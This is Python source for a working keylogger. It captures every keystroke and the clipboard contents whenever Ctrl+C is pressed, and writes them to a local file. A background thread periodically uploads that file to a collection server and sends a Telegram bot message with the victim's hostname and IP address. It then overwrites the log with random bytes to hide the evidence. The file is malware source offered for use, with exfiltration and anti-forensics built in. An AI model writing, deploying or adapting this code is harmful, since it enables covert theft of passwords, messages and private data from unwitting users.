import keyboard
import os
from datetime import datetime
import requests
import socket
import threading
import time
import subprocess

class KeyLogger:
    def __init__(self):

        #Keylogger configuration

        self.last_key = None
        self.special_keys = ["enter","tab","backspace","verr.maj","maj","ctrl","esc","space","alt","alt gr"] 
        self.function_keys = ["f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12",]
        self.output_file = "result.txt"
        self.buffer_size = 50 #characters
        self.key_buffer = ''
        self.telegram_token = "[TOKEN]"
        self.telegram_chatid = "[CHATID]"
        self.srv_url = "http://localhost:5000/upload"
        self.srv_cooldown = 60000 #Seconds
    
    #Preparing file for keylogging
    def prep_file(self):
        if not os.path.exists(self.output_file):
            open(self.output_file, "x")
        with open(self.output_file, "a", encoding="utf-8") as f:
            f.write(f'\n--- New logging session started at {datetime.now()} ---\n')

    #Deleting keylogger file
    def deletproof(self):
        if os.path.exists(self.output_file):
            with open(self.output_file, "r+b", buffering=0) as f:
                length = f.seek(0, os.SEEK_END)
                f.seek(0)
                f.write(os.urandom(length))
            #os.remove(self.output_file)

    # Send buffer to text file
    def write_buffer(self):
        with open(self.output_file, "a", encoding="utf-8") as f:
            f.write(self.key_buffer)
        self.key_buffer = ''
    
    # Clipboard function - copy clipboard
    def clipboard(self):
        clipboard_res = subprocess.check_output(['powershell', '-command','Get-Clipboard'], text=True)
        with open(self.output_file, "a", encoding="utf-8") as f:
            f.write(f"\nCTRL+C Detected : {clipboard_res} \n")
        
    #Capturing keyboard press & buffer
    def on_key_press(self,event):
            key = ''
            if event.name in self.special_keys or event.name in self.function_keys:
                if event.name != self.last_key:
                    key = f' [{event.name}] '
            else:
                key = ((event.name).encode('utf-8', 'ignore').decode())
            self.last_key = event.name
            self.key_buffer += key
            print(self.key_buffer)

            if len(self.key_buffer) >= self.buffer_size:
                self.write_buffer()
                print("Buffer sended")

    #keylog file sender to our srv + telegram notification
    def filesender(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        message = f"📄 Hello, new file from {hostname} -> {ip_address}"

        with open(self.output_file, "rb") as f:
            files = {"file": (f"{ip_address}_log_{datetime.now()}.txt",f)}
            response = requests.post(self.srv_url, files=files)

        print(response.status_code)
        print(response.text)

        url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage?chat_id={self.telegram_chatid}&text={message}"
        requests.get(url).json()
        self.deletproof()

    #cooldown each info sending to srv
    def cooldown(self):
        while True:
            time.sleep(self.srv_cooldown)
            self.write_buffer()
            self.filesender()

    #Main func
    def run(self):
        self.prep_file()
        threading.Thread(target=self.cooldown, daemon=True).start()
        keyboard.add_hotkey('ctrl+c', self.clipboard)
        keyboard.on_press(self.on_key_press)
        keyboard.wait('esc')
        self.write_buffer()
        #self.filesender()
        self.deletproof()

if __name__ == "__main__":
    KeyLogger().run()